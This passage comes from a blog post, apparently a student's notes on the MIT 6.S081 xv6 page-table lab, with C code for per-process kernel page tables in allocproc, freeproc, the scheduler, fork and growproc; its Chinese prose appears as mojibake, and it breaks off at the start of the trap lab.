class="hljs-params">()</span></span>;<br></code></pre></td></tr></table></figure><p>æ ¹æ®å‰é¢å‡½æ•°è°ƒç”¨çš„åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°è¿™ä¸ªmainä¸­userinit -&gt; allocprocçš„è°ƒç”¨ã€‚allocprocå‡½æ•°è¿”å›ä¸€ä¸ªæœªè¢«åˆ©ç”¨çš„è¿›ç¨‹ï¼Œå¹¶ä¸”åšåˆå§‹åŒ–å·¥ä½œï¼Œæ¯”å¦‚ä¸‹é¢çš„è¿™ä¸€äº›ä»£ç æ¥è‡ªallocprocï¼Œåšäº†ç”¨æˆ·é¡µè¡¨çš„åˆå§‹åŒ–å·¥ä½œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// An empty user page table.</span><br>p-&gt;pagetable = proc_pagetable(p);<br><span class="hljs-keyword">if</span>(p-&gt;pagetable == <span class="hljs-number">0</span>)&#123;<br>  freeproc(p);<br>  release(&amp;p-&gt;lock);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åŒæ ·çš„ï¼Œæ—¢ç„¶å·²ç»åœ¨ç»“æ„ä½“é‡Œé¢åŠ äº†kpgtableï¼Œé‚£ä¹ˆä¹Ÿè¦ç»™è¿›ç¨‹çš„å†…æ ¸æ€é¡µè¡¨åšåˆå§‹åŒ–å·¥ä½œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">p-&gt;kpgtable=ukvminit();<br><span class="hljs-keyword">if</span>(p-&gt;kpgtable == <span class="hljs-number">0</span>)&#123;<br>  freeproc(p);<br>  release(&amp;p-&gt;lock);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨procinitå‡½æ•°ä¸­ï¼Œä¸ºäº†ç»™è¿›ç¨‹åˆå§‹åŒ–å†…æ ¸æ ˆï¼Œæœ‰è¿™æ ·ä¸€æ®µä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Allocate a page for the process&#x27;s kernel stack.</span><br><span class="hljs-comment">// Map it high in memory, followed by an invalid</span><br><span class="hljs-comment">// guard page.</span><br><span class="hljs-keyword">char</span> *pa = kalloc();<br><span class="hljs-keyword">if</span>(pa == <span class="hljs-number">0</span>)<br>  panic(<span class="hljs-string">&quot;kalloc&quot;</span>);<br>uint64 va = KSTACK((<span class="hljs-keyword">int</span>) (p - proc));<br>kvmmap(va, (uint64)pa, PGSIZE, PTE_R | PTE_W);<br>p-&gt;kstack = va;<br></code></pre></td></tr></table></figure><p>ç±»ä¼¼çš„ï¼Œåœ¨allocprocå‡½æ•°ä¸­ï¼Œæˆ‘ä»¬éœ€è¦åˆå§‹åŒ–å†…æ ¸æ ˆå¹¶å°†å…¶æ˜ å°„åˆ°è¿›ç¨‹å•ç‹¬çš„å†…æ ¸é¡µè¡¨ï¼Œéœ€è¦åŠ ä¸Šï¼šï¼ˆåœ¨è¿™ä¹‹åå¯ä»¥å°†procinitä¸­åˆå§‹åŒ–å†…æ ¸æ ˆçš„ä»£ç æ³¨é‡Šæ‰ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">p-&gt;kpgtable=ukvminit();<br><span class="hljs-keyword">if</span>(p-&gt;kpgtable == <span class="hljs-number">0</span>)&#123;<br>  freeproc(p);<br>  release(&amp;p-&gt;lock);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">char</span> *pa = kalloc();<br><span class="hljs-keyword">if</span>(pa == <span class="hljs-number">0</span>)<br>  panic(<span class="hljs-string">&quot;kalloc&quot;</span>);<br>uint64 va = KSTACK((<span class="hljs-keyword">int</span>) (p - proc));<br>ukvmmap(p-&gt;kpgtable, va, (uint64)pa, PGSIZE, PTE_R | PTE_W);<br>p-&gt;kstack = va;<br></code></pre></td></tr></table></figure><p>freeprocå‡½æ•°ï¼Œè¦å°†è¿›ç¨‹çš„å†…æ ¸é¡µè¡¨è¿›è¡Œæ¸…é™¤</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// free a proc structure and the data hanging from it,</span><br><span class="hljs-comment">// including user pages.</span><br><span class="hljs-comment">// p-&gt;lock must be held.</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">freeproc</span><span class="hljs-params">(struct proc *p)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span>(p-&gt;trapframe)<br>    kfree((<span class="hljs-keyword">void</span>*)p-&gt;trapframe);<br>  p-&gt;trapframe = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span>(p-&gt;pagetable)<br>    proc_freepagetable(p-&gt;pagetable, p-&gt;sz);<br>  <span class="hljs-comment">/* add here */</span><br>  <span class="hljs-keyword">if</span> (p-&gt;kstack)<br>  &#123;<br>      <span class="hljs-keyword">pte_t</span>* pte = walk(p-&gt;kpgtable, p-&gt;kstack, <span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">if</span> (pte == <span class="hljs-number">0</span>)<br>          panic(<span class="hljs-string">&quot;freeproc: walk&quot;</span>);<br>      kfree((<span class="hljs-keyword">void</span>*)PTE2PA(*pte));<br>  &#125;<br>  p-&gt;kstack = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">if</span> (p-&gt;kpgtable)<br>    freewalk_kproc(p-&gt;kpgtable);<br>  <span class="hljs-comment">/* add here */</span><br>  p-&gt;pagetable = <span class="hljs-number">0</span>;<br>  p-&gt;sz = <span class="hljs-number">0</span>;<br>  p-&gt;pid = <span class="hljs-number">0</span>;<br>  p-&gt;parent = <span class="hljs-number">0</span>;<br>  p-&gt;name[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  p-&gt;chan = <span class="hljs-number">0</span>;<br>  p-&gt;killed = <span class="hljs-number">0</span>;<br>  p-&gt;xstate = <span class="hljs-number">0</span>;<br>  p-&gt;state = UNUSED;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦æ¨¡ä»¿freewalké‡æ–°å®ç°freewalk_kprocï¼Œä½¿å¾—ä»…ä»…è§£é™¤é¡µè¡¨çš„å†…å­˜æ˜ å°„è€Œä¸åƒfreewalkä¸€æ ·æ¸…é™¤ç‰©ç†é¡µæ•°æ®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">freewalk_kproc</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> pagetable)</span> </span>&#123;<br>  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">512</span>; i++)&#123;<br>    <span class="hljs-keyword">pte_t</span> pte = pagetable[i];<br>    <span class="hljs-keyword">if</span>((pte &amp; PTE_V))&#123;<br>      pagetable[i] = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> ((pte &amp; (PTE_R|PTE_W|PTE_X)) == <span class="hljs-number">0</span>)<br>      &#123;<br>        uint64 child = PTE2PA(pte);<br>        freewalk_kproc((<span class="hljs-keyword">pagetable_t</span>)child);<br>      &#125;<br>    &#125;<br>  &#125;<br>  kfree((<span class="hljs-keyword">void</span>*)pagetable);<br>&#125;<br></code></pre></td></tr></table></figure><p> åœ¨è°ƒåº¦ç¨‹åºschedulerä¸­ï¼Œè°ƒåº¦ç¨‹åºä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦åˆ‡æ¢åˆ°è¿›ç¨‹è‡ªå·±çš„å†…æ ¸é¡µè¡¨å¤„ï¼Œå¹¶ä½¿ç”¨sfence.vmaåˆ·æ–°å½“å‰ CPU çš„ TLB</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Per-CPU process scheduler.</span><br><span class="hljs-comment">// Each CPU calls scheduler() after setting itself up.</span><br><span class="hljs-comment">// Scheduler never returns.  It loops, doing:</span><br><span class="hljs-comment">//  - choose a process to run.</span><br><span class="hljs-comment">//  - swtch to start running that process.</span><br><span class="hljs-comment">//  - eventually that process transfers control</span><br><span class="hljs-comment">//    via swtch back to the scheduler.</span><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">scheduler</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cpu</span> *<span class="hljs-title">c</span> =</span> mycpu();<br>  <br>  c-&gt;proc = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span>(;;)&#123;<br>    <span class="hljs-comment">// Avoid deadlock by ensuring that devices can interrupt.</span><br>    intr_on();<br>    <br>    <span class="hljs-keyword">int</span> found = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;<br>      acquire(&amp;p-&gt;lock);<br>      <span class="hljs-keyword">if</span>(p-&gt;state == RUNNABLE) &#123;<br>        <span class="hljs-comment">// Switch to chosen process.  It is the process&#x27;s job</span><br>        <span class="hljs-comment">// to release its lock and then reacquire it</span><br>        <span class="hljs-comment">// before jumping back to us.</span><br>        p-&gt;state = RUNNING;<br>        c-&gt;proc = p;<br>        <span class="hljs-comment">//åˆ‡æ¢åˆ°è¿›ç¨‹è‡ªå·±çš„å†…æ ¸é¡µè¡¨å¤„</span><br>        w_satp(MAKE_SATP(p-&gt;kpgtable));<br>        <span class="hljs-comment">//ä½¿ç”¨sfence.vmaåˆ·æ–°å½“å‰ CPU çš„ TLB</span><br>        sfence_vma();<br>        <span class="hljs-comment">//è°ƒåº¦è¿›ç¨‹</span><br>        swtch(&amp;c-&gt;context, &amp;p-&gt;context);<br>        <span class="hljs-comment">//åˆ‡æ¢å›å†…æ ¸é¡µè¡¨</span><br>        kvminithart();<br>        <br>        <span class="hljs-comment">// Process is done running for now.</span><br>        <span class="hljs-comment">// It should have changed its p-&gt;state before coming back.</span><br>        c-&gt;proc = <span class="hljs-number">0</span>;<br><br>        found = <span class="hljs-number">1</span>;<br>      &#125;<br>      release(&amp;p-&gt;lock);<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> !defined (LAB_FS)</span><br>    <span class="hljs-keyword">if</span>(found == <span class="hljs-number">0</span>) &#123;<br>      intr_on();<br>      <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;wfi&quot;</span>)</span></span>;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    ;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»™ vm.c æ·»åŠ å¤´æ–‡ä»¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;spinlock.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;proc.h&quot;</span><span class="hljs-comment">//å¦‚æœé¡ºåºé¢ å€’ä¼šæŠ¥ç»“æ„ä½“å®šä¹‰é”™è¯¯</span></span><br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ <code>kvmpa</code> å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">pte = walk(myproc()-&gt;kpgtable, va, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h2 id="Simplify-copyin-copyinstr"><a href="#Simplify-copyin-copyinstr" class="headerlink" title="Simplify copyin/copyinstr"></a>Simplify <code>copyin/copyinstr</code></h2><blockquote><p>å†…æ ¸çš„ copyin å‡½æ•°è¯»å–ç”¨æˆ·æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ã€‚å®ƒé€šè¿‡å°†å®ƒä»¬è½¬æ¢ä¸ºç‰©ç†åœ°å€æ¥å®ç°è¿™ä¸€ç‚¹ï¼Œè€Œå†…æ ¸å¯ä»¥ç›´æ¥å–æ¶ˆå¯¹å®ƒä»¬çš„å¼•ç”¨ã€‚å®ƒé€šè¿‡åœ¨è½¯ä»¶ä¸­éå†è¿‡ç¨‹é¡µè¡¨æ¥æ‰§è¡Œè¿™ç§è½¬æ¢ã€‚åœ¨å®éªŒå®¤çš„è¿™ä¸€éƒ¨åˆ†ä¸­ï¼Œæ‚¨çš„å·¥ä½œæ˜¯å‘æ¯ä¸ªè¿›ç¨‹çš„å†…æ ¸é¡µè¡¨(åœ¨å‰ä¸€èŠ‚ä¸­åˆ›å»º)æ·»åŠ ç”¨æˆ·æ˜ å°„ï¼Œä»¥å…è®¸ copyin (ä»¥åŠç›¸å…³çš„å­—ç¬¦ä¸²å‡½æ•° copinstr)ç›´æ¥å–æ¶ˆå¼•ç”¨ç”¨æˆ·æŒ‡é’ˆã€‚</p></blockquote><p>é¦–å…ˆå£°æ˜copyin_newå’Œcopyinstr_new</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">copyin_new</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> pagetable, <span class="hljs-keyword">char</span> *dst, uint64 srcva, uint64 len)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">copyinstr_new</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> pagetable, <span class="hljs-keyword">char</span> *dst, uint64 srcva, uint64 max)</span></span>;<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹copyinå‡½æ•°ï¼Œä½¿å¾—æ”¹ä¸ºæ‰§è¡Œcopyin_new</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">copyin</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> pagetable, <span class="hljs-keyword">char</span> *dst, uint64 srcva, uint64 len)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> copyin_new(pagetable, dst, srcva, len);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">copyinstr</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> pagetable, <span class="hljs-keyword">char</span> *dst, uint64 srcva, uint64 max)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> copyinstr_new(pagetable, dst, srcva, max);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¢åŠ ä¸€ä¸ªu2kvmcopyå‡½æ•°ï¼Œå®Œæˆé¡µè¡¨çš„å¤åˆ¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> </span><br><span class="hljs-function"><span class="hljs-title">u2kvmcopy</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> upagetable, <span class="hljs-keyword">pagetable_t</span> kpagetable, uint64 oldsz, uint64 newsz)</span></span><br><span class="hljs-function"></span>&#123;<br>  oldsz = PGROUNDUP(oldsz);<br>  <span class="hljs-keyword">for</span> (uint64 i = oldsz; i &lt; newsz; i += PGSIZE) &#123;<br>    <span class="hljs-keyword">pte_t</span>* pte_from = walk(upagetable, i, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(pte_from == <span class="hljs-number">0</span>) <br>      panic(<span class="hljs-string">&quot;pte_from&quot;</span>);<br>    <span class="hljs-keyword">pte_t</span>* pte_to = walk(kpagetable, i, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(pte_to == <span class="hljs-number">0</span>) <br>      panic(<span class="hljs-string">&quot;pte_to&quot;</span>);<br>    uint64 pa = PTE2PA(*pte_from);<br>    uint flag = (PTE_FLAGS(*pte_from)) &amp; (~PTE_U);<br>    *pte_to = PA2PTE(pa) | flag;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>userinitåŠ ä¸Šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">u2kvmcopy(np-&gt;pagetable, np-&gt;kpgtable, <span class="hljs-number">0</span>, np-&gt;sz);<br></code></pre></td></tr></table></figure><p>forkåŠ ä¸Šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">u2kvmcopy(np-&gt;pagetable, np-&gt;kpgtable, <span class="hljs-number">0</span>, np-&gt;sz);<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Create a new process, copying the parent.</span><br><span class="hljs-comment">// Sets up child kernel stack to return as if from fork() system call.</span><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">fork</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> i, pid;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">np</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<br><br>  <span class="hljs-comment">// Allocate process.</span><br>  <span class="hljs-keyword">if</span>((np = allocproc()) == <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// Copy user memory from parent to child.</span><br>  <span class="hljs-keyword">if</span>(uvmcopy(p-&gt;pagetable, np-&gt;pagetable, p-&gt;sz) &lt; <span class="hljs-number">0</span>)&#123;<br>    freeproc(np);<br>    release(&amp;np-&gt;lock);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br>  np-&gt;sz = p-&gt;sz;<br><br>  np-&gt;parent = p;<br><br>  <span class="hljs-comment">// copy saved user registers.</span><br>  *(np-&gt;trapframe) = *(p-&gt;trapframe);<br><br>  <span class="hljs-comment">// Cause fork to return 0 in the child.</span><br>  np-&gt;trapframe-&gt;a0 = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">// increment reference counts on open file descriptors.</span><br>  <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; NOFILE; i++)<br>    <span class="hljs-keyword">if</span>(p-&gt;ofile[i])<br>      np-&gt;ofile[i] = filedup(p-&gt;ofile[i]);<br>  np-&gt;cwd = idup(p-&gt;cwd);<br>  u2kvmcopy(np-&gt;pagetable, np-&gt;kpgtable, <span class="hljs-number">0</span>, np-&gt;sz);<br>  safestrcpy(np-&gt;name, p-&gt;name, <span class="hljs-keyword">sizeof</span>(p-&gt;name));<br><br>  pid = np-&gt;pid;<br><br>  np-&gt;state = RUNNABLE;<br><br>  release(&amp;np-&gt;lock);<br><br>  <span class="hljs-keyword">return</span> pid;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨execå‡½æ•°åŠ ä¸Š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">u2kvmcopy(np-&gt;pagetable, np-&gt;kpgtable, <span class="hljs-number">0</span>, np-&gt;sz);<br>  <span class="hljs-comment">// Push argument strings, prepare rest of stack in ustack.</span><br>  <span class="hljs-keyword">for</span>(argc = <span class="hljs-number">0</span>; argv[argc]; argc++) &#123;<br>    <span class="hljs-keyword">if</span>(argc &gt;= MAXARG)<br>      <span class="hljs-keyword">goto</span> bad;<br>    sp -= <span class="hljs-built_in">strlen</span>(argv[argc]) + <span class="hljs-number">1</span>;<br>    sp -= sp % <span class="hljs-number">16</span>; <span class="hljs-comment">// riscv sp must be 16-byte aligned</span><br>    <span class="hljs-keyword">if</span>(sp &lt; stackbase)<br>      <span class="hljs-keyword">goto</span> bad;<br>    <span class="hljs-keyword">if</span>(copyout(pagetable, sp, argv[argc], <span class="hljs-built_in">strlen</span>(argv[argc]) + <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>      <span class="hljs-keyword">goto</span> bad;<br>    ustack[argc] = sp;<br>  &#125;<br></code></pre></td></tr></table></figure><p>growproc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Grow or shrink user memory by n bytes.</span><br><span class="hljs-comment">// Return 0 on success, -1 on failure.</span><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">growproc</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br>  uint sz;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<br><br>  sz = p-&gt;sz;<br>  <span class="hljs-keyword">if</span>(n &gt; <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">if</span>((sz = uvmalloc(p-&gt;pagetable, sz, sz + n)) == <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    u2kvmcopy(p-&gt;pagetable, p-&gt;kpgtable, sz-n, sz);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n &lt; <span class="hljs-number">0</span>)&#123;<br>    sz = uvmdealloc(p-&gt;pagetable, sz, sz + n);<br>  &#125;<br>  p-&gt;sz = sz;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/image-20230520212417687.png"></p><h2 id="å‚è€ƒ-1"><a href="#å‚è€ƒ-1" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><a href="https://blog.csdn.net/rocketeerLi/article/details/121524760">https://blog.csdn.net/rocketeerLi/article/details/121524760</a></li><li><a href="https://fanxiao.tech/posts/2021-03-02-mit-6s081-notes/#38-lab-3-pgtbl">https://fanxiao.tech/posts/2021-03-02-mit-6s081-notes/#38-lab-3-pgtbl</a></li></ul><h1 id="Lab4-trap"><a href="#Lab4-trap" class="headerlink" title="Lab4 trap"></a>Lab4 trap</h1><h2 id="å‰ç½®å‡†å¤‡"><a href="#å‰ç½®å‡†å¤‡" class="headerlink" title="å‰ç½®å‡†å¤‡"></a>å‰ç½®å‡†å¤‡</h2><ul><li><p>çœ‹å®Œ<a href="https://www.bilibili.com/video/BV19k4y1C7kA">p4ã€p5</a></p></li><li><p>ææ¸…æ¥š<a href="https://pdos.csail.mit.edu/6.S081/2020/labs/traps.html">labè¦æ±‚</a></p></li><li><p>å¯¹riscvæŒ‡ä»¤é›†ã€å‡½æ•°è°ƒç”¨çº¦å®šã€trapæœºåˆ¶æœ‰ä¸€å®šç†è§£</p></li></ul><h2 id="RISC-V-assembly-easy"><a href="#RISC-V-assembly-easy" class="headerlink" title="RISC-V assembly (easy)"></a>RISC-V assembly (<a href="https://pdos.csail.mit.edu/6.S081/2020/labs/guidance.html">easy</a>)</h2><p>é€šè¿‡make fs.img 